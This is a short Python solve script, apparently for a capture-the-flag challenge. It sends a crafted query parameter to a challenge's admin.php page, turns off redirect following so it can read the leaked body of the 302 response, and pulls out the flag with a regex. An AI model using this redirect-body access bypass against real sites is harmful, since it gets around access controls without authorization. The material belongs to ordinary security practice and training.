#!/usr/bin/env python3
import requests
import re
import sys

def main():
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = "http://0602.chall.kali-team.online:8001/admin.php"
        
    params = {"PrintFlag": "Execute: Get_Flag.sh"}
    # allow_redirects=False is key to see the 302 body easily
    r = requests.get(url, params=params, allow_redirects=False)
    
    match = re.search(r'KaliTeam\{[^}]+\}', r.text)
    if match:
        print("Flag found:", match.group(0))
    else:
        print("Flag not found.")

if __name__ == '__main__':
    main()
